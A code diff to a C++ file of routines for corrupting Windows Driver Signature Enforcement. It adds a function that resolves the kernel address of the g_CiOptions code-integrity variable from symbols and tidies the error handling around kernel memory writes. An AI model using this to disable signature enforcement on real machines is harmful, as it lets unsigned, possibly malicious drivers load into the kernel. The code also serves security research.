@@ -4,9 +4,9 @@
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.30
+*  VERSION:     1.31
 *
-*  DATE:        20 Mar 2023
+*  DATE:        09 Apr 2023
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -297,6 +297,85 @@ NTSTATUS KDUQueryCiOptions(
 }
 
 /*
+* KDUQueryCodeIntegrityVariableSymbol
+*
+* Purpose:
+*
+* Find CI variable address from MS symbols.
+*
+*/
+ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
+    _In_ ULONG NtBuildNumber
+)
+{
+    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
+    LPWSTR lpModuleName;
+    HMODULE mappedImageBase;
+
+    WCHAR szFullModuleName[MAX_PATH * 2];
+
+    if (NtBuildNumber < NT_WIN8_RTM) {
+        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
+    }
+    else {
+        lpModuleName = (LPWSTR)CI_DLL;
+    }
+
+    if (symInit() == FALSE)
+        return 0;
+
+    szFullModuleName[0] = 0;
+    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
+        return 0;
+
+    _strcat(szFullModuleName, TEXT("\\"));
+    _strcat(szFullModuleName, lpModuleName);
+
+    //
+    // Preload module for pattern search.
+    //
+    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mappedImageBase) {
+
+        printf_s("[+] Module \"%ws\" loaded for symbols lookup\r\n", lpModuleName);
+
+        imageLoadedBase = supGetNtOsBase();
+
+        if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {
+
+            if (symLookupAddressBySymbol("g_CiOptions", &kernelAddress)) {
+
+                Result = (ULONG_PTR)imageLoadedBase + kernelAddress - (ULONG_PTR)mappedImageBase;
+                supPrintfEvent(kduEventInformation, "[+] Symbol resolved to 0x%llX address\r\n", Result);
+
+            }
+            else {
+                supPrintfEvent(kduEventError, "[!] Unable to find specified symbol\r\n");
+            }
+
+        }
+        else {
+            supPrintfEvent(kduEventError, "[!] Unable to load symbols for file\r\n");
+        }
+
+        FreeLibrary(mappedImageBase);
+    }
+    else {
+
+        //
+        // Output error.
+        //
+        supPrintfEvent(kduEventError,
+            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
+            lpModuleName,
+            GetLastError());
+
+    }
+
+    return Result;
+}
+
+/*
 * KDUQueryCodeIntegrityVariableAddress
 *
 * Purpose:
@@ -391,11 +470,7 @@ ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
 
         }
         else {
-
-            supPrintfEvent(kduEventError,
-                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
-                ntStatus);
-
+            supShowHardError("[!] Failed to locate kernel variable address", ntStatus);
         }
 
         FreeLibrary(mappedImageBase);
@@ -486,9 +561,7 @@ BOOL KDUControlDSE2(
     if (!VpQueryInformation(
         Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
     {
-        supPrintfEvent(kduEventError,
-            "[!] Could not query victim image information, GetLastError %lu\r\n", GetLastError());
-
+        supShowWin32Error("[!] Cannot query victim image information", GetLastError());
     }
     else {
 
@@ -574,10 +647,7 @@ BOOL KDUControlDSE(
         sizeof(ulFlags));
 
     if (!bResult) {
-        supPrintfEvent(kduEventError,
-            "[!] Could not query DSE state, GetLastError %lu\r\n",
-            GetLastError());
-
+        supShowWin32Error("[!] Cannot query DSE state", GetLastError());
     }
     else {
 
@@ -627,16 +697,11 @@ BOOL KDUControlDSE(
 
             }
             else {
-                supPrintfEvent(kduEventError,
-                    "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
-                    dwLastError);
-
+                supShowWin32Error("[!] Cannot verify kernel memory write", dwLastError);
             }
         }
         else {
-            supPrintfEvent(kduEventError,
-                "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
-                dwLastError);
+            supShowWin32Error("[!] Error while writing to the kernel memory", dwLastError);
         }
 
     }
